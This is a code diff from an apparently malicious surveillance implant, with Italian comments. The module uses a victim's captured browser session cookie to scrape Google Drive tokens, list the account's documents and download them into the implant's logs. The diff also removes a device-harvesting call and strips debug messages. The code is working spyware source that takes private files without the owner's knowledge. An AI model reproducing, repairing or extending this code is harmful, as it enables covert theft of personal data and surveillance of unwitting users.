@@ -14,26 +14,18 @@
 //#define SOCIAL_USER_AGENT L"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko)"
 
 extern char *base64_encodeY(const unsigned char *input, int length);
-extern BOOL bPM_MailCapStarted; // variabili per vedere se gli agenti interessati sono attivi
+extern BOOL bPM_FileAgentStarted; // variabili per vedere se gli agenti interessati sono attivi
 
 extern DWORD GetLastFBTstamp(char *user, DWORD *hi_part);
 extern void SetLastFBTstamp(char *user, DWORD tstamp_lo, DWORD tstamp_hi);
 
 extern BOOL Log_CopyCloudFile(PGD_FILE pFile, WCHAR *display_name, BOOL empty_copy, DWORD agent_tag);
 
-extern DWORD GDev_GetDevices(LPSTR pszCookie);
-
-extern BOOL  g_bSendGoogleDevice;
-
 //google docs handler
 DWORD HandleGoogleDrive(LPSTR pszCookie)
 {
-	//get the google devices and save device a log
-	if(g_bSendGoogleDevice)
-		GDev_GetDevices(pszCookie);
-
-	if(!bPM_MailCapStarted)
-		return SOCIAL_REQUEST_SUCCESS;
+	if(!bPM_FileAgentStarted)
+		return SOCIAL_REQUEST_NETWORK_PROBLEM;
 	
 	GD_PARAMS Params;	
 	DWORD	  dwRet, dwErr = SOCIAL_REQUEST_BAD_COOKIE;
@@ -52,12 +44,17 @@ DWORD HandleGoogleDrive(LPSTR pszCookie)
 		if(dwRet == GD_E_SUCCESS)
 		{
 			//download the documents
-			GD_DownloadFiles(&DocList, &Params, pszCookie);
+			dwRet = GD_DownloadFiles(&DocList, &Params, pszCookie);
+			if(dwRet == GD_E_SUCCESS)
+				dwErr = SOCIAL_REQUEST_SUCCESS;
 
 			//download the files
-			GD_DownloadFiles(&FileList, &Params, pszCookie);
+			dwRet = GD_DownloadFiles(&FileList, &Params, pszCookie);
+			if(dwRet == GD_E_SUCCESS)
+				dwErr = SOCIAL_REQUEST_SUCCESS;
 		}
 	}
+
 	
 	GD_DeleteFileList(&DocList.List);
 	GD_DeleteFileList(&FileList.List);
@@ -102,10 +99,6 @@ DWORD GD_ExtractConnParams(LPSTR pszBuffer, PGD_PARAMS pParams)
 	pszTmp = strstr(pszBuffer, "xsrf\"");
 	if(pszTmp == NULL)
 	{
-		//#ifdef _DEBUG
-		//	OutputDebugString(L"[!] Connection parameter not found (xsrf).");
-		//#endif
-
 		return GD_E_NO_PARAMS;
 	}
 	pszBuffer = pszTmp;
@@ -119,10 +112,7 @@ DWORD GD_ExtractConnParams(LPSTR pszBuffer, PGD_PARAMS pParams)
 	}
 	if(pszTmp == NULL)
 	{
-		//#ifdef _DEBUG
-		//	OutputDebugString(L"[!] Connection parameter not found (0).");
-		//#endif
-		
+	
 		return GD_E_NO_PARAMS;
 	}
 
@@ -138,10 +128,6 @@ DWORD GD_ExtractConnParams(LPSTR pszBuffer, PGD_PARAMS pParams)
 			pParams->pszToken = (LPSTR)malloc(i);
 			if(pParams->pszToken == NULL)
 			{
-				//#ifdef _DEBUG
-				//	OutputDebugString(L"[!] Memory allocation failed (token).");
-				//#endif
-
 				return GD_E_ALLOC;
 			}
 
@@ -155,10 +141,6 @@ DWORD GD_ExtractConnParams(LPSTR pszBuffer, PGD_PARAMS pParams)
 
 	if(pParams->pszToken == NULL)
 	{
-		//#ifdef _DEBUG
-		//	OutputDebugString(L"[!] Connection parameter not found (token).");
-		//#endif
-
 		return GD_E_NO_PARAMS;
 	}
 	*/
@@ -172,10 +154,6 @@ DWORD GD_ExtractConnParams(LPSTR pszBuffer, PGD_PARAMS pParams)
 	pszTmp = strstr(pszBuffer, "drive_main\",");
 	if(pszTmp == NULL)
 	{
-		//#ifdef _DEBUG
-		//	OutputDebugString(L"[!] Connection parameter not found (drive_main).");
-		//#endif
-		
 		return GD_E_NO_PARAMS;
 	}
 
@@ -188,10 +166,6 @@ DWORD GD_ExtractConnParams(LPSTR pszBuffer, PGD_PARAMS pParams)
 	}	
 	if(pszTmp == NULL)
 	{
-		#ifdef _DEBUG
-			OutputDebugString(L"[!] Connection parameter not found (1).");
-		#endif		
-
 		return GD_E_NO_PARAMS;
 	}
 
@@ -212,10 +186,6 @@ DWORD GD_ExtractConnParams(LPSTR pszBuffer, PGD_PARAMS pParams)
 			pParams->pszDevKey = (LPSTR)malloc(i);
 			if(pParams->pszDevKey == NULL)
 			{
-				//#ifdef _DEBUG
-				//	OutputDebugString(L"[!] Memory allocation failed (key).");
-				//#endif
-
 				return GD_E_ALLOC;
 			}
 			SecureZeroMemory(pParams->pszDevKey, i);
@@ -662,10 +632,6 @@ DWORD GD_GetFileList_V2(PGD_FILE_LIST pDocList, PGD_FILE_LIST pFileList, PGD_PAR
 	}
 	else
 	{
-		//#ifdef _DEBUG
-		//	OutputDebugString(L"[!] Parsing JSON data failed (GD_GetFileList(JSON))");
-		//#endif
-			
 		dwRet = GD_E_GENERIC;
 	}
 	
@@ -767,10 +733,6 @@ DWORD GD_GetFileInfo_V2(PGD_FILE *pFile, JSONObject jFileObj, DWORD dwSavedTimes
 	*pFile = (PGD_FILE)malloc(sizeof(GD_FILE));	
 	if(*pFile == NULL)
 	{
-		//#ifdef _DEBUG
-		//OutputDebugString(L"[!] Memory allocation failed (GD_GetFileInfo(File))");
-		//#endif
-
 		return GD_E_ALLOC;
 	}
 	pNewFile = *pFile;	
@@ -782,10 +744,6 @@ DWORD GD_GetFileInfo_V2(PGD_FILE *pFile, JSONObject jFileObj, DWORD dwSavedTimes
 	if(pNewFile->pwszFileID == NULL)
 	{
 		znfree((LPVOID*)pFile);
-
-		//#ifdef _DEBUG
-		//OutputDebugString(L"[!] Memory allocation failed (GD_GetFileInfo(FileID))");
-		//#endif
 
 		return GD_E_ALLOC;
 	}
@@ -802,10 +760,6 @@ DWORD GD_GetFileInfo_V2(PGD_FILE *pFile, JSONObject jFileObj, DWORD dwSavedTimes
 		{
 			znfree((LPVOID*)&pNewFile->pwszFileID);
 			znfree((LPVOID*)pFile);				
-
-			#ifdef _DEBUG
-			OutputDebugString(L"[!] Memory allocation failed (GD_GetFileInfo(FileName))");
-			#endif
 
 			return GD_E_ALLOC;
 		}
@@ -1154,7 +1108,6 @@ DWORD GD_GetFileList(PGD_FILE_LIST pFileList, PGD_PARAMS pParams, LPSTR pszCooki
 	JSONValue *jValue;
 	JSONArray jFiles, jArray;
 
-	OutputDebugString("[GD] GD_GetFileList");
 
 	//get the file list
 	dwRet = HttpSocialRequest(L"drive.google.com", L"GET", L"/du", 443, NULL, 0, (LPBYTE*)&pszRecvBuffer, &dwBufferSize, pszCookie);
@@ -1170,14 +1123,11 @@ DWORD GD_GetFileList(PGD_FILE_LIST pFileList, PGD_PARAMS pParams, LPSTR pszCooki
 		{
 			znfree(&pszRecvBuffer);
 
-			OutputDebugString("[GD] GD_GetFileList FAILED (0).");
 			
 			return GD_E_HTTP;
 		}
 	}
 	
-//	OutputDebugString("[GD] GD_GetFileList Parsing JSON struct");
-
 	//parse the list (json structure)
 	jValue = JSON::Parse(&pszRecvBuffer[5]);
 
@@ -1226,8 +1176,6 @@ DWORD GD_GetFileList(PGD_FILE_LIST pFileList, PGD_PARAMS pParams, LPSTR pszCooki
 	}
 	else
 	{		
-		OutputDebugString("[GD] GD_GetFileList FAILED (1)");
-				
 		dwRet = GD_E_GENERIC;
 	}
 	
